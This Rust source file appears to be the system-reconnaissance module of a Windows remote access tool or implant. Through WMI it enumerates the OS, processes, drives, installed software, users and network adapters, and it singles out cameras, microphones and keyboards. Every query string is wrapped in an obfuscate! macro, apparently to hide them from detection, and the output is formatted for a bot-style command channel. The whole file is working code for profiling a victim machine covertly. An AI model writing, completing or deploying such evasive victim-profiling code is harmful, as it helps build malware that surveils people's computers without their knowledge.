use anyhow::{Result, Context, bail};
use std::collections::HashMap;
use wmi::{Variant, WMIConnection};

use crate::obfuscate;



pub async fn info() -> Result<String> {

	let wmi_con = WMIConnection::new()?;
	let os_query : &str = &obfuscate!("SELECT * from Win32_OperatingSystem");
	let sys_query: &str = &obfuscate!("SELECT * from Win32_ComputerSystem");

	let caption  : &str = &obfuscate!("Caption");
	let version  : &str = &obfuscate!("Version");
	let build_num: &str = &obfuscate!("BuildNumber");
	let arch     : &str = &obfuscate!("OSArchitecture");
	let manufact : &str = &obfuscate!("Manufacturer");

	let os_info  : Vec<HashMap<String, Variant>> = wmi_con.raw_query(os_query)?;
    let sys_info : Vec<HashMap<String, Variant>> = wmi_con.raw_query(sys_query)?;

    let mut list = String::new();
    for info in os_info {
    	let name = match info.get(caption) {
    		Some(Variant::String(name)) => name.clone(),
    		_ => continue,
    	};
    	let vrs = match info.get(version) {
    		Some(Variant::String(vrs)) => vrs.clone(),
    		_ => continue,
    	};
    	let build = match info.get(build_num) {
    		Some(Variant::String(build)) => build.clone(),
    		_ => continue,
    	};    	
    	let a = match info.get(arch) {
    		Some(Variant::String(a)) => a.clone(),
    		_ => continue,
    	};

    	list += &(obfuscate!("\n*b_Name:_b* ") + &name);
    	list += &(obfuscate!("\n*b_Version:_b* ") + &vrs);
    	list += &(obfuscate!("\n*b_Build:_b* ") + &build);
    	list += &(obfuscate!("\n*b_Architecture:_b* ") + &a);
  
    }

    for info in sys_info {
    	if let Some(Variant::String(manu)) = info.get(manufact) {
    		list += &obfuscate!("\n*b_Manufacturer:_b* ");
    		list += &manu;
    	}
    }
    Ok(list)
}

pub async fn proc_list() -> Result<String> {
	let mut list = String::new();
	let wmi_con = WMIConnection::new()?;
	
	let query : &str = &obfuscate!("SELECT * from Win32_Process");
	let pid   : &str = &obfuscate!("ProcessId");
	let name  : &str = &obfuscate!("Name");

	let result: Vec<HashMap<String, Variant>> = wmi_con.raw_query(query)?;
	for process in result {
		let p = match process.get(pid) {
			Some(Variant::UI4(p)) => *p,
			_ => continue,
		};

		let n = match process.get(name) {
			Some(Variant::String(n)) => n.clone(),
			_ => continue,
		};

		list += "\n--------\n";
		list += &format!("*b_{}_b*\t{}", p, n);
	};

    Ok(list)
}

pub async fn drives() -> Result<String> {
	let mut list = String::new();
	let wmi_con = WMIConnection::new()?;

	let query : &str = &obfuscate!("SELECT * from Win32_LogicalDisk");
	let name  : &str = &obfuscate!("Name");
	let size  : &str = &obfuscate!("Size");
	let space : &str = &obfuscate!("FreeSpace");

	let result: Vec<HashMap<String, Variant>> = wmi_con.raw_query(query)?;
	list += &obfuscate!("Name\tSize\tFreeSpace\n----\t----\t---------\n");

	for drv in result {
            let n = match drv.get(name) {
                Some(Variant::String(n)) => n.clone(),
                _ => continue,
            };

            let s = match drv.get(size) {
                Some(Variant::UI8(s)) => s.clone(),
                _ => continue,
            };
            let fspace = match drv.get(space) {
                Some(Variant::UI8(fspace)) => fspace.clone(),
                _ => continue,
            };
         
            list += &format!("*b_{:#?}_b*    {:#?}GB    {:#?}GB\n", n, s /( 1024 * 1024 * 1024), fspace /( 1024 * 1024 * 1024));   
	};

    Ok(list)
}

pub async fn sw() -> Result<String> {
	let mut list = String::new();
	let wmi_connection = WMIConnection::new()?;

	let query: &str = &obfuscate!("SELECT * from Win32_Product");
	let name : &str = &obfuscate!("Name");
	let version: &str = &obfuscate!("Version");

	let result: Vec<HashMap<String, Variant>> = wmi_connection.raw_query(query)?;
	
	for software in result {
		let n = match software.get(name) {
			Some(Variant::String(n)) => n.clone(),
			_ => continue,
		};

		let vr = match software.get(version) {
			Some(Variant::String(vr)) => vr.clone(),
			_ => continue,
		};
		
		list += "---------";
		list += &format!("\n{} : *b_{}_b*\n", n, vr);
		
	};

	Ok(list)	
}



pub async fn hw() -> Result<String> {
	let mut list = String::new();
	let wmi_con  = WMIConnection::new()?;

	let query :&str = &obfuscate!("SELECT * from Win32_PnPEntity");
	let name  :&str = &obfuscate!("Name");
	let cam   :&str = &obfuscate!("camera");
	let wcam  :&str = &obfuscate!("webcam");
	let audio :&str = &obfuscate!("microphone");
	let keyb  :&str = &obfuscate!("keyboard");
	let mouse :&str = &obfuscate!("mouse");

	let result: Vec<HashMap<String,Variant>> = wmi_con.raw_query(query)?;

	let mut devices: HashMap<String, Vec<String>> = HashMap::new();
			devices.insert(obfuscate!("Cameras"), Vec::new());
			devices.insert(obfuscate!("Microphones"), Vec::new());
		    devices.insert(obfuscate!("Keyboards & Mouses"), Vec::new());
		    devices.insert(obfuscate!("USB Devices"), Vec::new());
		    devices.insert(obfuscate!("Other Devices"), Vec::new());

	for hw in result {
		if let Some(Variant::String(n)) = hw.get(name) {
			let lower_name = n.to_lowercase();

			let category = if lower_name.contains(cam) || lower_name.contains(wcam) {obfuscate!("Cameras")}
              	else if lower_name.contains(audio)  {obfuscate!("Microphones")} 
                else if lower_name.contains(keyb) || lower_name.contains(mouse) {obfuscate!("Keyboards & Mouses")} 
                else if lower_name.contains("usb") {obfuscate!("USB Devices")} 
                else {obfuscate!("Other Devices")};
            
            // Add device to category

            if let Some(dev) = devices.get_mut(&category) {
            	dev.push(n.to_string())
            }
		}
	}

	for (category, device) in devices {
		list += &format!("\n*b_{}_b* :\n", category);
		list += &format!("------\n");
		for d in device {
			list += &format!(" - {}\n", d);
		}
	}

	Ok(list)
}


pub async fn users() -> Result<String> {
	let mut list = String::new();
	let wmi_con = WMIConnection::new()?;

	let query   : &str = &obfuscate!("SELECT * from Win32_UserAccount");
	let name    :&str  = &obfuscate!("Name");
	let domain  :&str  = &obfuscate!("Domain");
	let l_accnt :&str  = &obfuscate!("LocalAccount");
	let desc    :&str  = &obfuscate!("Description");

	let result: Vec<HashMap<String, Variant>> = wmi_con.raw_query(query)?;
	for user in result {
            let n = match user.get(name) {
                Some(Variant::String(n)) => n.clone(),
                _ => continue,
            };

            let d = match user.get(domain) {
                Some(Variant::String(d)) => d.clone(),
                _ => continue,
            };
            let local = match user.get(l_accnt) {
                Some(Variant::Bool(local)) => local.clone(),
                _ => continue,
            };
            
            let ds = match user.get(desc) {
                Some(Variant::String(ds)) => ds.clone(),
                _ => continue,
            };

            list += &format!("\n--------\n");
            list += &obfuscate!("*b_Name :_b* ");
            list += &n;
            list += &obfuscate!("\n*b_Domain :_b* ");
            list += &d;
            list += &obfuscate!("\n*b_Local :_b* ");
            list += &format!("{local}");
            list += &obfuscate!("\n*b_Desc :_b* ");
            list += &ds;
       	}

	Ok(list)
} 

pub async fn net() -> Result<String> {
	let mut list = String::new();
	let wmi_con = WMIConnection::new()?;

	let query :&str  = &obfuscate!("SELECT * from Win32_NetworkAdapter");
	let name  :&str  = &obfuscate!("Name");
	let addr  :&str  = &obfuscate!("MACAddress");
	let enabld:&str  = &obfuscate!("NetEnabled");
	let manu  :&str  = &obfuscate!("Manufacturer");

	let result: Vec<HashMap<String, Variant>> = wmi_con.raw_query(query)?;

	
	for net in result {
            let n = match net.get(name) {
                Some(Variant::String(n)) => n.clone(),
                _ => continue,
            };

            let mac = match net.get(addr) {
                Some(Variant::String(mac)) => mac.clone(),
                _ => continue,
            };
            let ne = match net.get(enabld) {
                Some(Variant::Bool(ne)) => ne.clone(),
                _ => continue,
            };
            
            let mf = match net.get(manu) {
                Some(Variant::String(manu)) => manu.clone(),
                _ => continue,
            };

            list += &format!("\n--------\n");
            list += &obfuscate!("*b_Name:_b* ");
            list += &n;
			list += &obfuscate!("\n*b_MAC:_b* ");
			list += &mac;
			list += &obfuscate!("\n*b_NetEnabled:_b* ");
			list += &format!("{ne}");
			list += &obfuscate!("\n*b_Manufacturer:_b* ");
			list += &mf;

    }

	Ok(list)
} 

